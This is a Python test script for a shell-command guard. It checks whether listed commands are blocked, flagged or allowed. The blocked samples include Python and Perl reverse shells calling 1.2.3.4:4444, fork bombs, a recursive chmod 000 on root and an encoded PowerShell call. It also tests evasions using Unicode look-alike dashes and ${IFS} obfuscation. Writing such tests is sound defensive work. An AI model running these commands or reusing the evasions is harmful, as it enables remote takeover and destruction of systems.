# -*- coding: utf-8 -*-
import sys
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(ROOT))
sys.path.insert(0, str(ROOT / "bench"))

from bypass_matrix import evaluate

targets = [
    # (命令, 期望)
    ("git branch －D feature/x", "flag"),
    ("git rebase −-onto main feature old", "flag"),
    ("git tag ﹣d v1.0", "flag"),
    ("ssh host 'ls -la'", "flag"),
    ('python3 -c "import socket,subprocess,os; s=socket.socket(); s.connect((\'1.2.3.4\',4444)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); subprocess.call([\'/bin/sh\'])"', "block"),
    ("bomb()${IFS}$9{${IFS}$9bomb${IFS}$9|${IFS}$9bomb${IFS}$9&${IFS}$9};${IFS}$9bomb", "block"),
    (":(){ :|:& };:", "block"),
    ("echo${IFS}$9ok;${IFS}$9chmod${IFS}$9-R${IFS}$9000${IFS}$9/", "block"),
    ("powershell -enc OgAgAD4AIAAvAGUAdABjAC8AcABhAHMAcwB3AGQA -NoProfile", "block"),
    ("perl –e 'use Socket;$i=\"1.2.3.4\";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");system(\"/bin/sh –i\");'", "block"),
    # 误杀对照组 (必须保持 allow)
    ("git status", "allow"),
    ("git branch feature/x", "allow"),
    ("ssh -T git@github.com", "allow"),
    ("ssh deploy@host", "allow"),
    ("awk '{print $1 | \"sort\"}' data.txt", "allow"),
    ("awk '{print $1}' data.txt", "allow"),
    ("python3 -c \"import socket; s=socket.socket(); s.connect(('db.local',5432)); s.close()\"", "allow"),
    ("ssh host", "allow"),
]

ok = 0
for cmd, exp in targets:
    level, src = evaluate(cmd)
    passed = (exp == "block" and level == "block") or (exp == "flag" and level in ("block", "flag")) or (exp == "allow" and level == "allow")
    ok += passed
    print(f"{'PASS' if passed else 'FAIL'}  exp={exp:<5} got={level:<5} {cmd[:80]!r}  [{src[:40]}]")

print(f"\n{ok}/{len(targets)} passed")
